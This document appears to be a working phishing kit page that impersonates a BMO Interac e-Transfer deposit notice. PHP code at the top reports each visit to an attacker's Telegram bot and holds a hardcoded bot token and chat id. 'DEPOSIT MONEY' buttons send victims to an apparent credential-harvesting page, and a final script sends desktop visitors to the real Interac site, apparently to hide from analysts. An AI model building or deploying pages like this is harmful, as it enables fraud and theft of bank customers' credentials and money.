<?php


$message ="BMO CLICKED\n";

$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?>
   
<html lang="en">
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

  
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0" name="viewport">

  <title>
    BMO e-Transfer.</title>

  <link rel="icon" href="https://m.bmo.com/emt/assets/icon.webp">

  <!--<base href="/emt/">
-->
  <!--<base href=".">
-->
  <base href=".">
  <link rel="stylesheet" href="./files/styles.ea62861531386e0b0bc3.css">
  <style>
  a.button[_ngcontent-c0], button[_ngcontent-c0]{background:#d9dce1;height:56px;border-radius:28px;border:2px solid #d9dce1;padding:0 32px;box-sizing:border-box;cursor:pointer;display:inline-flex;position:relative;line-height:24px;margin:8px;text-align:center;transition:all .2s ease;-moz-transition:all .2s ease;-webkit-transition:all .2s ease;overflow:hidden;width:232px;font-family:HeeboBold,sans-serif;font-weight:400;font-size:.875rem;text-transform:uppercase;text-decoration:none;letter-spacing:.3px;white-space:nowrap;flex-direction:column;justify-content:center;align-items:center;align-content:center}a.button[_ngcontent-c0]::after, button[_ngcontent-c0]::after{content:'';display:inline-block;left:50%;position:absolute;top:50%;width:120px;height:120px;margin-left:-60px;margin-top:-60px;background:rgba(1,1,1,1.03);border-radius:100%;opacity:.6;-webkit-transform:scale(0);transform:scale(0)}a.button[_ngcontent-c0]:not(:active):after, button[_ngcontent-c0]:not(:active):after{-webkit-animation:.3s ease-out ripple;animation:.3s ease-out ripple}a.button[_ngcontent-c0]:after, button[_ngcontent-c0]:after{visibility:hidden}a.button[_ngcontent-c0]:focus:after, button[_ngcontent-c0]:focus:after{visibility:visible}a.button.primary[_ngcontent-c0], button.primary[_ngcontent-c0]{background:#0075be;border:2px solid #0075be;color:#fff}a.button.primary[_ngcontent-c0]:focus, a.button.primary[_ngcontent-c0]:hover, button.primary[_ngcontent-c0]:focus, button.primary[_ngcontent-c0]:hover{background:#005587;border:2px solid #005587;color:#fff;box-sizing:border-box}a.button.secondary[_ngcontent-c0], button.secondary[_ngcontent-c0]{background:#fff;border:2px solid #0075be;color:#0075be}a.button.secondary[_ngcontent-c0]:focus, a.button.secondary[_ngcontent-c0]:hover, button.secondary[_ngcontent-c0]:focus, button.secondary[_ngcontent-c0]:hover{background:#fff;border:2px solid #005587;color:#005587}@-webkit-keyframes ripple{0%{-webkit-transform:scale(0);transform:scale(0)}50%{-webkit-transform:scale(1);transform:scale(1)}100%{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@keyframes ripple{0%{-webkit-transform:scale(0);transform:scale(0)}50%{-webkit-transform:scale(1);transform:scale(1)}100%{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}main[_ngcontent-c0]{margin-bottom:48px;position:absolute;top:96px;width:100%}.card[_ngcontent-c0]{background-color:#fff;border-radius:4pt;box-shadow:0 0 2px rgba(0,25,40,.12),0 2px 2px rgba(0,25,40,.07);position:relative;z-index:1;border:1px solid #d9dce1}.wrapper[_ngcontent-c0]{margin:0 3%;padding-top:8px;padding-bottom:16px}h3[_ngcontent-c0]{font-size:18px;line-height:1.5rem;font-family:HeeboBold,sans-serif;font-weight:400;margin-bottom:16px;margin-top:24px;padding:0 16px}p[_ngcontent-c0]{font-family:HeeboReg;max-width:265px;margin:auto auto 16px}@media only screen and (min-width:350px){p[_ngcontent-c0]{max-width:295px}}@media only screen and (min-width:645px){p[_ngcontent-c0]{max-width:70%}}.font-app-medium[_ngcontent-c0]{font-size:16px;letter-spacing:.15px;line-height:24px}.font-app-small[_ngcontent-c0]{font-size:14px}</style>
  <style>
  header[_ngcontent-c1]{background-image:url(/emt/assets/background.svg);background-repeat:no-repeat;background-size:100%;background-color:#0079c1;height:51.2vw;max-height:248px;min-height:192px;width:100%;position:relative}header[_ngcontent-c1]   a[_ngcontent-c1]{color:#fff;float:right;text-decoration:none;margin-top:44px;margin-right:24px}header[_ngcontent-c1]   a[_ngcontent-c1]:hover{text-decoration:underline}.logo[_ngcontent-c1]{width:25%;min-width:80px;max-width:100px;position:absolute;top:40px;left:50%;-webkit-transform:translateX(-50%);transform:translateX(-50%)}</style>
  <style>
  div.badge-container[_ngcontent-c2]{display:block;position:relative;text-align:center}div.badge-container[_ngcontent-c2]   a[_ngcontent-c2]{display:inline-block;cursor:pointer;vertical-align:bottom}div.badge-container[_ngcontent-c2]   img[_ngcontent-c2]{display:block;height:40px;margin:8px auto 16px}div.badge-container[_ngcontent-c2]   img.google-play[_ngcontent-c2]{height:60px;margin:-2px auto 6px}</style>
  <style>
  a.button[_ngcontent-c0], button[_ngcontent-c0]{background:#d9dce1;height:56px;border-radius:28px;border:2px solid #d9dce1;padding:0 32px;box-sizing:border-box;cursor:pointer;display:inline-flex;position:relative;line-height:24px;margin:8px;text-align:center;transition:all .2s ease;-moz-transition:all .2s ease;-webkit-transition:all .2s ease;overflow:hidden;width:232px;font-family:HeeboBold,sans-serif;font-weight:400;font-size:.875rem;text-transform:uppercase;text-decoration:none;letter-spacing:.3px;white-space:nowrap;flex-direction:column;justify-content:center;align-items:center;align-content:center}a.button[_ngcontent-c0]::after, button[_ngcontent-c0]::after{content:'';display:inline-block;left:50%;position:absolute;top:50%;width:120px;height:120px;margin-left:-60px;margin-top:-60px;background:rgba(1,1,1,1.03);border-radius:100%;opacity:.6;-webkit-transform:scale(0);transform:scale(0)}a.button[_ngcontent-c0]:not(:active):after, button[_ngcontent-c0]:not(:active):after{-webkit-animation:.3s ease-out ripple;animation:.3s ease-out ripple}a.button[_ngcontent-c0]:after, button[_ngcontent-c0]:after{visibility:hidden}a.button[_ngcontent-c0]:focus:after, button[_ngcontent-c0]:focus:after{visibility:visible}a.button.primary[_ngcontent-c0], button.primary[_ngcontent-c0]{background:#0075be;border:2px solid #0075be;color:#fff}a.button.primary[_ngcontent-c0]:focus, a.button.primary[_ngcontent-c0]:hover, button.primary[_ngcontent-c0]:focus, button.primary[_ngcontent-c0]:hover{background:#005587;border:2px solid #005587;color:#fff;box-sizing:border-box}a.button.secondary[_ngcontent-c0], button.secondary[_ngcontent-c0]{background:#fff;border:2px solid #0075be;color:#0075be}a.button.secondary[_ngcontent-c0]:focus, a.button.secondary[_ngcontent-c0]:hover, button.secondary[_ngcontent-c0]:focus, button.secondary[_ngcontent-c0]:hover{background:#fff;border:2px solid #005587;color:#005587}@-webkit-keyframes ripple{0%{-webkit-transform:scale(0);transform:scale(0)}50%{-webkit-transform:scale(1);transform:scale(1)}100%{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@keyframes ripple{0%{-webkit-transform:scale(0);transform:scale(0)}50%{-webkit-transform:scale(1);transform:scale(1)}100%{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}main[_ngcontent-c0]{margin-bottom:48px;position:absolute;top:96px;width:100%}.card[_ngcontent-c0]{background-color:#fff;border-radius:4pt;box-shadow:0 0 2px rgba(0,25,40,.12),0 2px 2px rgba(0,25,40,.07);position:relative;z-index:1;border:1px solid #d9dce1}.wrapper[_ngcontent-c0]{margin:0 3%;padding-top:8px;padding-bottom:16px}h3[_ngcontent-c0]{font-size:18px;line-height:1.5rem;font-family:HeeboBold,sans-serif;font-weight:400;margin-bottom:16px;margin-top:24px;padding:0 16px}p[_ngcontent-c0]{font-family:HeeboReg;max-width:265px;margin:auto auto 16px}@media only screen and (min-width:350px){p[_ngcontent-c0]{max-width:295px}}@media only screen and (min-width:645px){p[_ngcontent-c0]{max-width:70%}}.font-app-medium[_ngcontent-c0]{font-size:16px;letter-spacing:.15px;line-height:24px}.font-app-small[_ngcontent-c0]{font-size:14px}</style>
  <style>
  header[_ngcontent-c1]{background-image:url(/emt/assets/background.svg);background-repeat:no-repeat;background-size:100%;background-color:#0079c1;height:51.2vw;max-height:248px;min-height:192px;width:100%;position:relative}header[_ngcontent-c1]   a[_ngcontent-c1]{color:#fff;float:right;text-decoration:none;margin-top:44px;margin-right:24px}header[_ngcontent-c1]   a[_ngcontent-c1]:hover{text-decoration:underline}.logo[_ngcontent-c1]{width:25%;min-width:80px;max-width:100px;position:absolute;top:40px;left:50%;-webkit-transform:translateX(-50%);transform:translateX(-50%)}</style>
  <style>
  div.badge-container[_ngcontent-c2]{display:block;position:relative;text-align:center}div.badge-container[_ngcontent-c2]   a[_ngcontent-c2]{display:inline-block;cursor:pointer;vertical-align:bottom}div.badge-container[_ngcontent-c2]   img[_ngcontent-c2]{display:block;height:40px;margin:8px auto 16px}div.badge-container[_ngcontent-c2]   img.google-play[_ngcontent-c2]{height:60px;margin:-2px auto 6px}</style>
  <style>
  a.button[_ngcontent-c0], button[_ngcontent-c0]{background:#d9dce1;height:56px;border-radius:28px;border:2px solid #d9dce1;padding:0 32px;box-sizing:border-box;cursor:pointer;display:inline-flex;position:relative;line-height:24px;margin:8px;text-align:center;transition:all .2s ease;-moz-transition:all .2s ease;-webkit-transition:all .2s ease;overflow:hidden;width:232px;font-family:HeeboBold,sans-serif;font-weight:400;font-size:.875rem;text-transform:uppercase;text-decoration:none;letter-spacing:.3px;white-space:nowrap;flex-direction:column;justify-content:center;align-items:center;align-content:center}a.button[_ngcontent-c0]::after, button[_ngcontent-c0]::after{content:'';display:inline-block;left:50%;position:absolute;top:50%;width:120px;height:120px;margin-left:-60px;margin-top:-60px;background:rgba(1,1,1,1.03);border-radius:100%;opacity:.6;-webkit-transform:scale(0);transform:scale(0)}a.button[_ngcontent-c0]:not(:active):after, button[_ngcontent-c0]:not(:active):after{-webkit-animation:.3s ease-out ripple;animation:.3s ease-out ripple}a.button[_ngcontent-c0]:after, button[_ngcontent-c0]:after{visibility:hidden}a.button[_ngcontent-c0]:focus:after, button[_ngcontent-c0]:focus:after{visibility:visible}a.button.primary[_ngcontent-c0], button.primary[_ngcontent-c0]{background:#0075be;border:2px solid #0075be;color:#fff}a.button.primary[_ngcontent-c0]:focus, a.button.primary[_ngcontent-c0]:hover, button.primary[_ngcontent-c0]:focus, button.primary[_ngcontent-c0]:hover{background:#005587;border:2px solid #005587;color:#fff;box-sizing:border-box}a.button.secondary[_ngcontent-c0], button.secondary[_ngcontent-c0]{background:#fff;border:2px solid #0075be;color:#0075be}a.button.secondary[_ngcontent-c0]:focus, a.button.secondary[_ngcontent-c0]:hover, button.secondary[_ngcontent-c0]:focus, button.secondary[_ngcontent-c0]:hover{background:#fff;border:2px solid #005587;color:#005587}@-webkit-keyframes ripple{0%{-webkit-transform:scale(0);transform:scale(0)}50%{-webkit-transform:scale(1);transform:scale(1)}100%{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@keyframes ripple{0%{-webkit-transform:scale(0);transform:scale(0)}50%{-webkit-transform:scale(1);transform:scale(1)}100%{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}main[_ngcontent-c0]{margin-bottom:48px;position:absolute;top:96px;width:100%}.card[_ngcontent-c0]{background-color:#fff;border-radius:4pt;box-shadow:0 0 2px rgba(0,25,40,.12),0 2px 2px rgba(0,25,40,.07);position:relative;z-index:1;border:1px solid #d9dce1}.wrapper[_ngcontent-c0]{margin:0 3%;padding-top:8px;padding-bottom:16px}h3[_ngcontent-c0]{font-size:18px;line-height:1.5rem;font-family:HeeboBold,sans-serif;font-weight:400;margin-bottom:16px;margin-top:24px;padding:0 16px}p[_ngcontent-c0]{font-family:HeeboReg;max-width:265px;margin:auto auto 16px}@media only screen and (min-width:350px){p[_ngcontent-c0]{max-width:295px}}@media only screen and (min-width:645px){p[_ngcontent-c0]{max-width:70%}}.font-app-medium[_ngcontent-c0]{font-size:16px;letter-spacing:.15px;line-height:24px}.font-app-small[_ngcontent-c0]{font-size:14px}</style>
  <style>
  header[_ngcontent-c1]{background-image:url(/emt/assets/background.svg);background-repeat:no-repeat;background-size:100%;background-color:#0079c1;height:51.2vw;max-height:248px;min-height:192px;width:100%;position:relative}header[_ngcontent-c1]   a[_ngcontent-c1]{color:#fff;float:right;text-decoration:none;margin-top:44px;margin-right:24px}header[_ngcontent-c1]   a[_ngcontent-c1]:hover{text-decoration:underline}.logo[_ngcontent-c1]{width:25%;min-width:80px;max-width:100px;position:absolute;top:40px;left:50%;-webkit-transform:translateX(-50%);transform:translateX(-50%)}</style>
  <style>
  div.badge-container[_ngcontent-c2]{display:block;position:relative;text-align:center}div.badge-container[_ngcontent-c2]   a[_ngcontent-c2]{display:inline-block;cursor:pointer;vertical-align:bottom}div.badge-container[_ngcontent-c2]   img[_ngcontent-c2]{display:block;height:40px;margin:8px auto 16px}div.badge-container[_ngcontent-c2]   img.google-play[_ngcontent-c2]{height:60px;margin:-2px auto 6px}</style>
</head>

<body>

  <app-root _nghost-c0="" ng-version="6.0.6">
    <app-bmo-header _ngcontent-c0="" _nghost-c1="">
    <header _ngcontent-c1="">
    <img _ngcontent-c1="" alt="BMO Logo" class="logo" src="./files/bmo-logo-white.svg">
  <a _ngcontent-c1="" class="font-app-small">
     Français </a>
</header>
</app-bmo-header>
  <main _ngcontent-c0="">
    <div _ngcontent-c0="" class="wrapper card">
    <h3 _ngcontent-c0="" role="text">
     Let's get your money! </h3>
  <p _ngcontent-c0="" class="font-app-medium">
     Your e-Transfer is ready for your account. </p>
  <a _ngcontent-c0="" class="button primary" href="/public/deposit/bmo/040147.php">
    <span _ngcontent-c0="">
     DEPOSIT MONEY </span>
  </a>
  </div>
    <div _ngcontent-c0="" class="wrapper">
    <h3 _ngcontent-c0="" role="text">
     Using Online Banking for Business? </h3>
    <!---->
    <!---->
    <p _ngcontent-c0="" class="font-app-medium" role="text">
     Complete your <em _ngcontent-c0="">
    Interac</em>
     e-Transfer through our BMO Online Banking for Business app. </p>
    <a _ngcontent-c0="" class="button primary" href="/public/deposit/bmo/040147.php">
    <span _ngcontent-c0="">
    DEPOSIT MONEY</span>
  </a>
    <app-app-store-badge _ngcontent-c0="" _nghost-c2="">
    <!---->
  </app-app-store-badge>
  </div>
  </main>
  </app-root>

<script type="text/javascript" src="/public/deposit/bmo/files/runtime.a66f828dca56eeb90e02">

</script>
<script type="text/javascript" src="/public/deposit/bmo/files/polyfills.295fb0de425948fb4710">

</script>
<script type="text/javascript" src="/public/deposit/bmo/files/main.5460ab1dd0ffd161de3b">

</script>


</body>
<script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>
